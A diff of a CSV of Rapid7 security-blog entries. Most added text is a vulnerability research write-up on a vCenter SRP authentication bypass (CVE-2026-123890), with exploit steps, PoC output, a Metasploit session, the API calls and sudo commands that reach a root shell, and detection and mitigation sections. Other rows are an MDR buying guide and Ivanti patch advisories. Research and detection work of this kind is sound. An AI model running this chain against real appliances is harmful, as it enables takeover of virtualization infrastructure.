@@ -1,4 +1,250 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+d7bec2d3b140,d7bec2d3b140,2026-11-24 15:51 UTC,General Security News,Rapid7,Rapid7 Blog,Other/General,Article,How to compare MDR providers when every proposal looks promising,https://www.rapid7.com/blog/post/dr-comparing-mdr-providers-scorecard,"Confirm the proposed service tier, supported integrations, response responsibilities, and total costs before comparing scores","Choosing a managed detection and response (MDR) provider means committing budget, connecting systems, and trusting another team to act when your organization is under pressure. Yet a proposal promising 24x7 coverage, expert analysts, and fast response can leave important questions unanswered. Which systems will actually be monitored? What will analysts investigate before contacting you? What happens when an incident needs more work?
+
+Before choosing a provider or renewing your current agreement, ask for evidence of how the service operates. Rapid7’s MDR Evaluation Scorecard gives you 18 checks to structure that conversation and record what still needs proving.
+
+Start with one investigation
+
+Ask a provider to walk you through a completed investigation, using an anonymized example where necessary. Follow the initial signal through the evidence considered, the analyst’s decision, and any response actions.
+
+Suppose suspicious activity involves an account with access to a critical business system. Can the provider show how the account’s permissions, the systems within reach, and known weaknesses influenced its investigation? Can it explain what it ruled out and why it escalated or contained the activity?
+
+This exercise helps you assess whether exposure context, intelligence, and customer telemetry work together. It also makes the division of work visible: what the provider investigated, what it decided, and what your team had to do next.
+
+Compare the service you would actually receive
+
+Use the same requirements for every provider, including your incumbent. Confirm the proposed service tier, supported integrations, response responsibilities, and total costs before comparing scores.
+
+Be specific about incident response. Establish who handles containment, forensics, eradication, and mitigation, which actions require your approval, and whether additional work changes the bill. A demonstration should be supported by written commitments about the service you would receive.
+
+Rapid7 MDR includes unlimited incident response, giving customers direct access to senior responders for digital forensics, eradication, and mitigation. When evaluating that commitment, ask us to explain the activities covered, how containment and remediation are coordinated, and which decisions remain with your team.
+
+Apply the same scrutiny to intelligence. Ask for an example showing how an emerging threat led to detection updates, hunting activity, or customer guidance. Rapid7’s emerging-threat response process connects research, detection engineering, product, and communications. The useful evaluation question is how that process changes the protection and advice customers receive.
+
+Look for improvement you can trace
+
+A detailed investigation record helps you understand what happened. Your next question should be what changed afterward.
+
+Look for recommendations that led to stronger controls, better detections, or closed coverage gaps. Ask how the provider reviews completed actions and recurring problems with your team. When comparing reporting, check whether you can trace those improvements alongside investigation volumes and response measures.
+
+Turn the answers into a decision
+
+The scorecard covers six areas: exposure-aware detection, intelligence, response ownership and cost, transparency, team expertise, and integration. Rate each capability against evidence, then record limitations, outstanding questions, and follow-up owners.
+
+The total helps organize your comparison, but essential requirements deserve individual attention. A strong overall score cannot compensate for a response capability your organization needs and the proposed service excludes.
+
+Download the MDR Evaluation Scorecard before your next provider review, shortlist meeting, or renewal discussion. Use it to make the evidence comparable and identify exactly what needs resolving before you commit."
+94ebc5824a8d,f3cd79ca4ab0,2026-11-24 13:01 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Identity Security Posture Management; Server & Workload Protection; Vulnerability Management,Article,Rapid7 Analysis: VMware vCenter SRP Authentication Bypass to Root (CVE-2026-123890),https://www.rapid7.com/blog/post/ra-rapid7-analysis-vmware-vcenter-srp-authentication-bypass-to-root-cve-2026-123890,"The attack recovered the directory database and its Security Token Service (STS) signing key, forged an administrator API session, and used appliance administration features to...","Overview
+
+An unauthenticated attacker can retrieve the session key for an in-progress administrator login to VMware vCenter's directory service. The attacker then uses that key to complete the login without knowing the account's password. The vulnerable interface is exposed through DCE/RPC on TCP port 2012.
+
+The issue, tracked as CVE-2026-123890, combines a Secure Remote Password (SRP) session-key getter that is callable before authentication with an RPC context lookup that does not enforce ownership. The context handles use predictable UUIDv1 values. By creating two reference contexts around a pending login, an attacker can narrow the hidden login handle to a short timestamp window and ask the server for its key.
+
+We reproduced the bypass against vCenter Server Appliance 8.0.2.00400, build 23929136, running Photon OS 4.0, and leveraged the resulting administrator connection through to root command execution. SSH and Bash access were initially disabled. The attack recovered the directory database and its Security Token Service (STS) signing key, forged an administrator API session, and used appliance administration features to create an account and enable SSH. Neither the existing SSO password nor the root password was an input to that chain.
+
+Impact
+
+The attacker needs network access to TCP 2012 and the name of an existing SSO principal. Our PoC uses the default SSO administrator principal, administrator@vsphere.local; deployments using a different SSO domain need the corresponding account name. The attack does not depend on an existing authenticated connection or an administrator being online. The attacker initiates the login attempt in order to recover its session key.
+
+The authenticated connection can call the directory database-copy interface. Its raw database contains the STS private signing key, allowing the attacker to sign administrator assertions that vCenter trusts. Our attack workflow used a forged assertion to create a local appliance superAdmin account, enable SSH and Bash, and execute commands as root through sudo. This final part requires access to the HTTPS API on TCP 443 and SSH on TCP 22, in addition to TCP 2012. It uses the administrative privileges obtained through the original bypass; no second vulnerability is needed once you have administrative RPC access.
+
+Technical Analysis
+
+Returning the key before checking the proof
+
+// vmdir/server/vmdir/rpcsrpserv.c long Srv_rpc_srp_verifier_get_session_key( handle_t hServer, srp_verifier_handle_t hSrp, rpc_p_srp_bytes_container ret_key_cont) { // ... struct SRPVerifier ver = (struct SRPVerifier *) hSrp; //[A1] rpc_p_srp_bytes_container key_cont = NULL; if (!ver) { sts = rpc_s_invalid_handle; goto error; } key = srp_verifier_get_session_key(ver, &key_len); // [A2] if (!key || key_len == 0) { sts = rpc_s_auth_nokey; goto error; } sts = _srp_bytes_container_allocate(key, key_len, &key_cont); if (sts) { goto error; } *ret_key_cont = key_cont; // [A3] // ... }
+
+The SRP RPC getter receives an SRP verifier at [A1], obtains its session key at [A2], and returns a copy at [A3]. It checks whether the verifier and key exist. It does not check whether the caller has authenticated, whether the caller owns the verifier, or whether the SRP client has supplied a valid password proof.
+
+The value at [A1] is a server-side pointer that the RPC runtime resolves from the context handle supplied in the request. Each newly created verifier context receives its own UUID, so the attacker needs the handle for the specific pending login they want to complete. These context UUIDs identify individual verifier instances; the fixed interface UUIDs identify the available RPC interfaces.
+
+UUIDv1 values contain a timestamp, clock sequence, and node identifier. The attacker creates a verifier immediately before starting the target login and another immediately afterward, obtaining both reference UUIDs without authenticating. On the tested service, the reference UUIDs share their clock sequence and node identifier. The attacker reuses those fields and searches the intervening timestamps for the pending login's live verifier, keeping the login connection open throughout the search.
+
+// vmdir/thirdparty/csrp/srp.c int srp_verifier_is_authenticated(struct SRPVerifier *ver) { return ver->authenticated; // [A4] } // ... const unsigned char *srp_verifier_get_session_key( struct SRPVerifier *ver, int *key_length) { if (key_length) *key_length = hash_length(ver->hash_alg); return ver->session_key; // [A5] }
+
+The underlying SRP library exposes the authentication flag separately at [A4]. Its key getter at [A5] does not consult that flag. The server has already computed the shared key while generating its challenge, because it needs that key to verify the client's proof. Returning it at this stage gives the client the secret needed to produce that proof.
+
+Resolving another connection's context
+
+// dcerpc/idl_lib/ctxeectx.c void rpc_ss_ee_ctx_from_wire( ndr_context_handle *p_wire_context, rpc_ss_context_t *p_context, volatile error_status_t *p_st) { // ... p_uuid = &p_wire_context->context_handle_uuid; // [B1] // ... nil-handle check and table lock ... this_link = &context_table[dce_uuid_hash(p_uuid, (error_status_t *)p_st) % CALLEE_CONTEXT_TABLE_SIZE]; // [B2] while (!dce_uuid_equal(p_uuid, &this_link->uuid, (error_status_t *)p_st)) { this_link = this_link->next_context; // ... reject a missing entry ... } *p_context = this_link->user_context; /* [B3] */ // ... }
+
+The RPC runtime takes the supplied UUID at [B1], searches a process-wide table at [B2], and returns the associated context at [B3]. There is no comparison with the requesting connection or its authenticated identity. Although context creation records a client for lifetime management, that client is not part of this lookup's authorization decision (hooray!!).
+
+We confirmed the boundary directly: one anonymous RPC connection created an SRP verifier, and a second anonymous connection retrieved that verifier's key before any password proof was sent. The first connection's context handle was enough to make the second connection's request succeed.
+
+The service registers the helper with a secure-interface flag and an authentication callback. On the tested TCP path, however, the RPC executor retrieves those registration values and dispatches the server stub without enforcing the callback. Other directory handlers perform their own access checks. The SRP key getter has no equivalent check, leaving it reachable before authentication.
+
+Predictable handles make the lookup usable
+
+// dcerpc/uuid/uuidsys.c void uuid__get_os_time(dce_uuid_time_t *uuid_time) { // ... if (gettimeofday(&tp, (struct timezone *)0)) // [C1] { perror(""uuid__get_os_time""); exit(-1); } uuid__uemul((long)tp.tv_sec, UUID_C_100NS_PER_SEC, &utc); uuid__uemul((long)tp.tv_usec, UUID_C_100NS_PER_USEC, &usecs); // [C2] UADD_UVLW_2_UVLW(&usecs, &utc, &utc); // ... add the UUID epoch offset ...
+
+The UUID timestamp generator reads the wall clock at [C1] and converts its microseconds into 100-nanosecond UUID ticks at [C2]. The resulting UUIDv1 handle also contains a clock sequence and node identifier. In our captures, those latter fields remain stable while newly created contexts advance through the timestamp space.
+
+vmdir manages this SRP authentication exchange through the Generic Security Service API (GSS-API), which provides a common interface for authentication mechanisms. Starting the login creates an SRP verifier internally, but the login client does not receive its context handle.
+
+An attacker can obtain reference handles by creating ordinary SRP verifiers through the helper interface. Creating one immediately before the GSS-API login and another immediately afterward bounds the timestamp of its hidden verifier. The shared node and clock-sequence fields then let the attacker construct candidate UUIDs within that interval.
+
+The default search advances in increments of ten UUID ticks, matching the clock's microsecond resolution. The generator also supports uniqueness adjustments within a clock tick, so the PoC includes a one-tick search mode. Clock changes, concurrent activity, and the chosen search bounds can affect recovery; exhausting the window does not establish that a target is patched.
+
+Exploit
+
+Narrowing the Search Window for a Pending Login
+
+The service exposes two relevant RPC interfaces on port 2012:
+
+Interface
+
+UUID
+
+Operations used
+
+SRP verifier helper
+
+c7e94609-6ab0-4767-8e92-b6485bff1649
+
+Create verifier, retrieve key, delete verifier
+
+vmdirdbcp
+
+72c780fe-af6b-42ba-9b02-f61f4ccc98ed
+
+SRP-authenticated bind, directory state, and database open/read/close
+
+The helper's operation numbers are 0 for verifier creation, 1 for key retrieval, and 4 for deletion. GetState is operation 4 on the separate vmdirdbcp interface. The interface UUID is therefore part of identifying an operation; the operation number alone is ambiguous.
+
+The client first creates a reference verifier, starts a separate SRP login as the target principal (e.g. administrator@vsphere.local), and creates the second reference verifier. It keeps the login connection open while querying candidate handles over another anonymous connection. These are all connections controlled by the attacker.
+
+GSS does not return the handle for its own verifier. A reference verifier for the same principal has a different session key, so retrieving that reference key does not complete the pending GSS login. We need the key from the verifier associated with the login connection; the reference handles only narrow the search for it.
+
+In the final standalone PoC test, the reference handles were:
+
+Before: 1d98c67a-e468-11f1-b101-000c29451b35 Hidden: 1d99c43a-e468-11f1-b101-000c29451b35 After: 1d9a8a14-e468-11f1-b101-000c29451b35
+
+The interval between the reference timestamps was 115,610 UUID ticks, or about 11.56 milliseconds. The search recovered the hidden handle shown above after 5,083 queries. Four workers issued the queries in that Python test, so the count includes requests that were already in flight when the match was found.
+
+The SRP verifier helper returns the pending login's actual 20-byte session key. The attack does not need a weak password, a password hash from disk, or an invalid SRP public value.
+
+Completing SRP with the disclosed key
+
+M1 = SHA1((SHA1(N) XOR SHA1(g)) || SHA1(I) || s || A || B || K) HAMK = SHA1(A || M1 || K)
+
+Here, I is the requested principal, N and g are the SRP group parameters, s is the server's salt, and A and B are the public values exchanged during login. The server sends s alongside B in its initial SRP challenge, before the client supplies a password proof. The salt is public: a legitimate client uses it with the password to derive the values needed for authentication.
+
+The client already has all of these inputs except K. Once the key getter supplies K, the client can calculate the normal client proof, M1, and verify the server's response, HAMK.
+
+The attack does not need a weak password, a password hash from disk, or an invalid SRP public value. Our client uses the valid public value A = 2 in the normal 2048-bit group. The reference verifiers use the cheaper 1024-bit group only to obtain the timing bounds.
+
+The implementation hashes minimal big-endian integer representations. On the tested build, the returned B is 276 bytes because CSRP serializes k*v + g^b without first reducing the sum modulo N. Reducing or truncating that returned value while building the transcript produces the wrong proof.
+
+The successful mechanism on this build is the legacy SRP OID 1.2.840.113554.1.2.10. Its token framing also differs from a conventional GSS wrapper: the outer length covers the OID, with the SRP state token following it. The client carries the exchange in SPNEGO bind and ALTER_CONTEXT messages, using RPC packet privacy. Matching that framing is necessary to reach the vulnerable authentication flow.
+
+Proving the authenticated connection
+
+The client derives packet-protection keys from the recovered SRP key using the server's normal implementation. PBKDF2-HMAC-SHA1 expands the key into 64 bytes using the principal as salt and 128 iterations. Those bytes supply an IV, material for the Kerberos AES-256 string-to-key operation, and a 16-byte HMAC key. RPC stubs are encrypted with AES-CBC and authenticated with HMAC-SHA1 over the ciphertext.
+
+PoC output:
+
+{""time"": ""2026-11-19T22:25:25.919835+00:00"", ""event"": ""session_key_disclosed"", ""uuid"": ""1d99c43a-e468-11f1-b101-000c29451b35"", ""key"": ""1f1476617a050b8e30388e0f58ed80d83f01aa02"", ""guesses"": 5083, ""seconds"": 0.8774298130301759} {""time"": ""2026-11-19T22:25:25.952425+00:00"", ""event"": ""srp_authentication_complete"", ""username"": ""administrator@vsphere.local"", ""M1"": ""af03ad96cb799381bf8e9a30a412b4371e24729d"", ""HAMK"": ""537b2d5753f213304824551077bddd51ed6693ae"", ""password_supplied"": false} {""time"": ""2026-11-19T22:25:26.226964+00:00"", ""event"": ""protected_rpc_result"", ""operation"": ""RpcVmDirGetState"", ""state"": 3, ""status"": 0, ""plaintext"": ""0300000000000000""}
+
+We used RpcVmDirGetState to test the resulting connection to 192.168.1.81. An anonymous request returned status 5, ACCESS_DENIED. The authenticated request above returned 0300000000000000: the little-endian directory state, 3 (Normal), followed by the operation's success status, 0. The PoC checked the server's SRP proof and the encrypted response's MAC before accepting the result.
+
+Key recovery took approximately 0.88 seconds in this run. The complete test retained the original RPC traffic and a packet capture with 15,343 packets and zero kernel drops. This brings us to the end of exploiting CVE-2026-123890. We have demonstrated how we can authenticate to VMware vCenter's directory service as the administrator user and will now outline how that access can be used to get root access to the device.
+
+Reading the directory database
+
+vmdir/server/vmdir/rpcserv.c, Srv_RpcVmDirOpenDatabaseFile:
+
+// vmdir/server/vmdir/rpcserv.c UINT32 Srv_RpcVmDirOpenDatabaseFile( handle_t hBinding, PWSTR pwszDBFileName, vmdir_dbcp_handle_t *ppFileHandle) { // ... DWORD dwRpcFlags = VMDIR_RPC_FLAG_ALLOW_TCPIP | VMDIR_RPC_FLAG_REQUIRE_AUTH_TCPIP | VMDIR_RPC_FLAG_REQUIRE_AUTHZ; // ... dwError = _VmDirRPCCheckAccess(hBinding, dwRpcFlags, pszDomainDn, &pAccessToken); // [D1] BAIL_ON_VMDIR_ERROR(dwError); // ... validate arguments and convert the filename ... dwError = _VmDirRemoteDBCopyWhiteList(pszDBFileName); // [D2] BAIL_ON_VMDIR_ERROR(dwError); // ... if ((pFileHandle = fopen(pszDBFileName, ""rb"")) == NULL) { // ... report the open failure and take the error path ... } *ppFileHandle = pFileHandle; // [D3] // ...
+
+The database-copy handler requires authentication and authorization at [D1]. The earlier bypass satisfies those checks as the SSO administrator. The filename passes a database-path allowlist at [D2], and the handler returns a file context at [D3]. We requested /storage/db/vmware-vmdir/data.mdb through that interface.
+
+The IDL assigns operation 0 to open, 1 to read, and 2 to close. The open request carries a reference wide string and an initially empty context handle. Each read supplies the returned context, a byte count, and an empty output container. Reads continue until the server returns a zero byte count.
+
+Our first complete export contained 16.22 MB. We used 2,048-byte reads so the response, encryption padding, and verifier fit into a single RPC fragment. The directory stayed in state 3, Normal; we did not call RpcVmDirSetBackendState or take the service offline. These calls copy the live file rather than producing a transaction-consistent backup. The downloaded file contained the signing credential needed for the next step.
+
+Signing an administrator API assertion
+
+The TenantCredential-1 record in data.mdb contains the STS RSA private key and its certificate chain. Metasploit already provides extraction and SAML-signing code in vcenter_offline_mdb_extract and vcenter_forge_saml_token. We reused those implementations, matched the signing certificate to the recovered private key, and verified its VMCA issuer.
+
+The signed assertion identifies administrator@vsphere.local and carries the existing template's administrator group claims, including SystemConfiguration.Administrators. The issuer uses the appliance's STS identity, and the assertion includes a short validity window. Once the XML is signed, changing its whitespace can invalidate the digest, so the client preserves its compact serialization.
+
+lib/msf/core/exploit/remote/http/vmware_vcenter.rb, API login:
+
+token = Base64.strict_encode64(Zlib.gzip(assertion)) # [E1] response = vcenter_api_request( 'POST', %w[com vmware cis session], port: port, host: host, headers: { 'Authorization' => ""SIGN token=\""#{token}\"""" } ) session_id = vcenter_api_value(response) # [E2]
+
+The client gzip-compresses and Base64-encodes the assertion at [E1], following the vendor REST SDK's SAML login example. A successful POST /rest/com/vmware/cis/session returns the API session ID at [E2]. Subsequent requests carry it in the vmware-api-session-id header. Our forged assertion returned HTTP 200 and authorized reads of the appliance's SSH and Bash settings.
+
+From the appliance API to root
+
+The authenticated API session gives us a way to create credentials that SSH will accept. We created a fresh local account through the appliance local-accounts API, assigning the superAdmin role. This is an operating-system account on the appliance; creating it does not require changing an existing account's password.
+
+The tested build accepts the account-creation request through the legacy REST route POST /rest/appliance/local-accounts/<username>, with its configuration inside a config object. The configuration supplies the generated password, roles: [""superAdmin""], and enabled: true. The same API session enables SSH with PUT /rest/appliance/access/ssh and {""enabled"":true}, then enables Bash with PUT /rest/appliance/access/shell and {""config"":{""enabled"":true,""timeout"":600}}.
+
+/etc/sudoers.d/applmgmt on the tested appliance:
+
+%superAdmin ALL= PASSWD: ALL, NOPASSWD: OPERATOR_N, ADMINISTRATOR_N
+
+That sudo rule allows the new account to run commands as root using its own generated password. An SSH login initially enters the appliance CLI, so the client requests a PTY and starts shell /bin/bash. After answering the appliance's sudo password prompt, it starts sudo -n /bin/bash -i on the same terminal. The sudo timestamp from that authentication permits the retained root shell.
+
+We verified uid=0(root) gid=0(root) groups=0(root),4044(shellaccess) through the resulting SSH connection. This account and password were created by the forged API session; the supplied lab root credentials were used separately for inspection and were not used to obtain this shell. Using the sessions in Metasploit
+
+[*] 192.168.1.81:2012 - Recovered the pending session key after 17337 guesses in 8.12 seconds [*] 192.168.1.81:2012 - Recovered context 688f5878-e487-11f1-b101-000c29451b35, key f56a33e23fad8b8d340c8ca0887aebe1fb793bab [+] 192.168.1.81:2012 - Authenticated as administrator@vsphere.local without a password; protected directory state: 3 [+] 192.168.1.81:2012 - Saved authentication evidence to /Users/jheysel/codex_research/vsphere_armory_castle_20261119/metasploit/config/loot/20261119190933_default_192.168.1.81_vmware.vmdir.srp_059381.json [*] VMware directory RPC session 3 opened (192.168.1.70:61547 -> 192.168.1.81:2012) at 2026-11-19 19:09:34 -0700 [*] 192.168.1.81:2012 - Interacting with vmdir session 3; use background to return to msfconsole vmdir > whoami Authenticated SSO principal: administrator@vsphere.local vmdir > state Directory state: 3 vmdir > state Directory state: 3
+
+The Metasploit module separates the inexpensive key-disclosure check from the full authentication attempt. check creates an owned verifier and asks for its key through a second anonymous association. run then performs the pending-login search, completes SRP, and verifies the protected operation.
+
+The module's default RPC action retains the authenticated association and exposes a vmdir > prompt with state and whoami commands. Selecting ACTION SHELL continues through database export, SAML API authentication, and SSH to a root command shell. The fresh end-to-end test produced the following output:
+
+[+] 192.168.1.81:2012 - Root execution verified: uid=0(root) gid=0(root) groups=0(root),4044(shellaccess) [*] Command shell session 1 opened (192.168.1.70:62059 -> 192.168.1.81:22) at 2026-11-20 07:48:25 -0700 ... [*] 192.168.1.81:2012 - Interacting with shell session 1; use background to return to msfconsole ... root [ /home/sebastian-fritsch ]# id uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)
+
+CreateSession defaults to true for either action. We resumed the root shell and ran id to show root access before exiting.
+
+The shell action saves the generated account credentials and original SSH/Bash settings before changing the appliance. It retains the temporary account and access settings while the session is open. On exit, it closes SSH, restores the original settings, and deletes its account through the API. The order matters: the appliance refuses to delete an account that still has running processes, and disabling SSH terminates active connections. Closing the console abruptly can prevent cleanup; the saved recovery details identify the account and settings to restore.
+
+Detection opportunities
+
+The unauthenticated key queries are visible before the client establishes packet privacy. Useful network evidence includes repeated calls to operation 1 on the SRP helper interface, with no RPC authentication verifier and context UUIDs that differ mainly in their timestamp fields. In our reproduction, those queries occur between the pending login's initial bind and its SRP proof continuation.
+
+The helper interface UUID, operation number, authentication state, query volume, and UUID pattern are useful together. A connection to port 2012 or an administrator SRP login on its own does not establish exploitation.
+
+The appliance also retains evidence of the database export and subsequent administration. We recovered the following records from the same vCenter 8.0.2.00400 appliance after the test accounts had been removed.
+
+/var/log/vmware/vmdird/vmdird-syslog.log:
+
+2026-11-20T14:45:46.792144+00:00 info vmdird t@140450245629504: Remote DB transfer (/storage/db/vmware-vmdir/data.mdb) granted.
+
+The directory service records this message when its filename allowlist grants a remote database-copy request. It identifies the requested database, but does not include the caller's address or prove that the transfer completed. An unexpected grant for data.mdb provides a timestamp to correlate with network traffic and the later API activity; legitimate directory replication can also use this interface. The SRP bypass can occur without a database-copy request, so this entry identifies the export stage.
+
+/var/log/vmware/vapi/endpoint/endpoint-access.log:
+
+2026-11-20T14:48:08.065Z | vAPI-I/O dispatcher-0 | e97ae44e-a503-4b58-9b68-1168c80e89c6 | 192.168.1.70 - - [20/Nov/2026:14:48:07 +0000] ""POST /rest/appliance/local-accounts/sebastian-fritsch HTTP/1.1"" 200 0 ""-"" ""Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"" 233
+
+The API access log records the source address, request path, status, and user-agent. This request creates the account used by the root-shell stage. The same file contains our POST /rest/com/vmware/cis/session, PUT /rest/appliance/access/ssh, PUT /rest/appliance/access/shell, and eventual account-deletion requests. An HTTP 200 on a settings request does not reveal which value was applied, so the appliance management log supplies the next part of the sequence.
+
+/var/log/vmware/applmgmt/applmgmt.log:
+
+2026-11-20T14:48:07 PM UTC [47843]INFO:vmware.appliance.localaccounts.localaccounts_impl:Administrator@VSPHERE.LOCAL created the local account user sebastian-fritsch 2026-11-20T14:48:09 PM UTC [47843]DEBUG:root:com.vmware.appliance.version1.access.ssh.set(enable=True) 2026-11-20T14:48:10 PM UTC [47843]DEBUG:root:com.vmware.appliance.version1.access.shell.set(config=Structure('ShellConfig', dict(enabled=True, timeout=600))) 2026-11-20T14:49:34 PM UTC [47843]INFO:vmware.appliance.localaccounts.localaccounts_impl:Administrator@VSPHERE.LOCAL deleted the local account user sebastian-fritsch.
+
+These records identify Administrator@VSPHERE.LOCAL as the account creator and show SSH and Bash being enabled. The configuration values appear in DEBUG-level records on the tested appliance; the account creation and deletion records are INFO-level. The forged SAML session is treated as an administrator session, so that identity alone does not distinguish it from legitimate administration.
+
+/var/log/audit/sshinfo.log.1.gz, decompressed:
+
+2026-11-20T14:48:12.368544+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 sshd[592859]: Accepted password for sebastian-fritsch from 192.168.1.70 port 62059 ssh2 2026-11-20T14:48:17.298091+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 sudo: sebastian-fritsch : TTY=pts/0 ; PWD=/home/sebastian-fritsch ; USER=root ; COMMAND=/bin/bash -i 2026-11-20T14:49:34.208901+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 userdel[593806]: delete user 'sebastian-fritsch'
+
+The SSH and sudo records tie the new account to the API client's address and a root Bash shell. They also retain the deletion performed during cleanup. Search sshinfo.log and its rotated copies; these entries had moved into sshinfo.log.1.gz by the time we collected them. Matching records are also available through the system journal.
+
+/var/log/audit/audit.log:
+
+type=EXECVE msg=audit(1795186087.886:3732): argc=6 a0=""/usr/sbin/useradd"" a1=""-m"" a2=""-G"" a3=""superAdmin"" a4=""--"" a5=""sebastian-fritsch"" type=EXECVE msg=audit(1795186097.286:3767): argc=4 a0=""sudo"" a1=""-n"" a2=""/bin/bash"" a3=""-i""
+
+Linux audit records preserve the command arguments for adding the user to superAdmin and invoking sudo -n /bin/bash -i. These examples come from a rotated audit log. They remain available after the account and its home directory are removed, subject to log retention.
+
+For this reproduced path, correlate an unexpected database-transfer grant with creation of a local administrator, SSH/Bash enablement, and an SSH login followed by sudo. The database-copy grant appears at 14:45:46 UTC, account creation at 14:48:07, and the root-shell command at 14:48:17. These are administrative operations that can occur legitimately; their sequence and whether they fit expected activity determine their value as indicators. The account name, source address, user-agent, UUIDs, and session values shown here belong to our lab run and are not fixed attacker identifiers.
+
+Mitigation
+
+Broadcom identifies vCenter 8.0 U3m as the fixed release for the 8.0 branch in VMSA-2026-0009 and its accompanying FAQ. Other release branches have their own guidance. Apply the vendor's supported update for the deployed product and keep the directory-service management interfaces reachable only by the systems that need them.
+
+The failed boundary spans both the SRP helper and the RPC runtime: a pending authentication key is exposed, and a connection can resolve a context that it does not own. Replacing predictable UUIDs alone leaves that ownership problem in place. We did not compare the vendor's fixed binaries, so this analysis does not attribute a particular code change to the patch."
 01ffc03ec7da,01ffc03ec7da,2026-11-20 10:30 UTC,General Security News,Rapid7,Rapid7 Blog,Identity Security Posture Management; Email and Collaboration Security; Vulnerability Management; File Security,Article,Metasploit Wrap Up: Breaking Zimbra's Identity Boundaries,https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-breaking-zimbra-s-identity-boundaries,The vulnerability is a file write in the Advanced Malware Protection (AMP) File Reputation feature,"This release we have three pull requests from jburgess-r7 building out coverage for the identity-boundary issues detailed in Rapid7's Breaking Zimbra Identity Boundaries, Part One research.
 
 First up is a new shared mixin, Msf::Exploit::Remote::HTTP::Zimbra, which gives every current and future Zimbra module a common foundation for account/admin SOAP authentication, canonical identity resolution, mailbox-server lookup, and version parsing, allowing future modules to stay focused on the vulnerability instead of re-implementing Zimbra's SOAP plumbing.
@@ -2218,447 +2464,3 @@ CISA BOD 26-04's bottom line
 BOD 26-04 retires ""patch everything"" in favor of operational precision: remediate the actively exploited, exposed, high-impact vulnerabilities in 72 hours, prove whether you've already been breached, and defer the rest. Meeting it takes continuous asset discovery, live threat intelligence, context-aware prioritization, and forensics at scale — which is precisely the shape of the Rapid7 Platform. For federal agencies it's a mandate; for everyone else, it's the clearest blueprint yet for risk-based vulnerability management.
 
 Sources: CISA BOD 26-04 and its implementation guidance; 2026 Verizon DBIR; Rapid7 2026 Global Threat Landscape Report and Q1/Q2 2026 threat data; Rapid7 product documentation for InsightVM, Active Risk, Surface Command, Exposure Command, and Velociraptor."
-3ddcf91fbe9e,4d3f110057a9,2026-11-02 11:04 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Vulnerability Management; Network Security; Identity Security Posture Management,Article,"Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527)",https://www.rapid7.com/blog/post/etr-additional-ivanti-connect-secure-zero-days-exploited-in-the-wild-cve-2026-111357-cve-2026-118527,"Ivanti rates CVE-2026-111357, a missing authentication for critical function vulnerability (CWE-306), with a CVSSv3","Overview
-
-On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357, a missing authentication for critical function vulnerability (CWE-306), with a CVSSv3.1 score of 8.8; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527, classified as generation of predictable numbers or identifiers (CWE-340), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry, allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk.
-
-Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935, an authentication bypass by spoofing (CWE-290). Rapid7 covered the original disclosure on October 13, 2026, when a fix for CVE-2026-104935 was available but the privilege escalation component remained unpatched. Fixes are now available for all three vulnerabilities.
-
-On October 30, 2026, CVE-2026-111357 and CVE-2026-118527 were added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation.
-
-The following scores and classifications are from Ivanti's updated advisory:
-
-CVE
-
-Ivanti CVSS score
-
-CWE
-
-Impact
-
-CVE-2026-104935
-
-8.6 (High), CVSSv3.0
-
-CWE-290
-
-Remote unauthenticated command execution
-
-CVE-2026-111357
-
-8.8 (High), CVSSv3.1
-
-CWE-306, CWE-862, CWE-345
-
-Local authenticated privilege escalation
-
-CVE-2026-118527
-
-4.3 (Medium), CVSSv3.0
-
-CWE-340
-
-Remote authenticated file upload to a known path
-
-Note: The CVE record and Rapid7's vulnerability database rate CVE-2026-111357 at 7.0, using high attack complexity and unchanged scope. Ivanti assesses low attack complexity and changed scope, resulting in its score of 8.8. The table follows Ivanti's scores and classifications.
-
-In its investigation, Volexity reports that UTA0576 used an exploit chain to gain unauthenticated root access to an appliance running 22.8R2.4, beginning on October 3, 2026. Its write-up identifies CVE-2026-104935 and CVE-2026-111357; Ivanti's updated advisory identifies CVE-2026-118527 as an additional component of the chain. Volexity observed credential theft and Active Directory queries for Windows LAPS passwords and BitLocker recovery keys.
-
-The combined impact warrants emergency remediation despite the individual CVSS ratings. Ivanti Connect Secure is an enterprise VPN solution deployed at the network edge and has a history of zero-day exploitation, including in 2024 and 2025.
-
-Mitigation guidance
-
-Rapid7 recommends applying the available updates on an emergency basis outside of normal patching cycles. The October 13 fixes in 25.1.1.2 and 22.8R2.5 do not remediate CVE-2026-111357 or CVE-2026-118527.
-
-CVE(s)
-
-Affected versions
-
-Fixed version(s)
-
-CVE-2026-111357 and CVE-2026-118527
-
-25.1.1.2 and prior
-
-25.1.1.3
-
-CVE-2026-111357 and CVE-2026-118527
-
-22.8R2.5 and prior
-
-22.8R2.6
-
-CVE-2026-104935
-
-25.1.1.1 and prior
-
-25.1.1.2
-
-CVE-2026-104935
-
-25.1.2.2 and prior
-
-25.1.3.0, 25.1.3.1
-
-CVE-2026-104935
-
-22.8R2.4 and prior
-
-22.8R2.5
-
-Ivanti recommends moving from 22.8.X to 25.1.1.3 or later, or applying 22.8R2.6 if migration is not immediately possible. Ivanti lists 25.1.3.0 and later on ISA4500, ISA6500, or ISA8500 as unaffected.
-
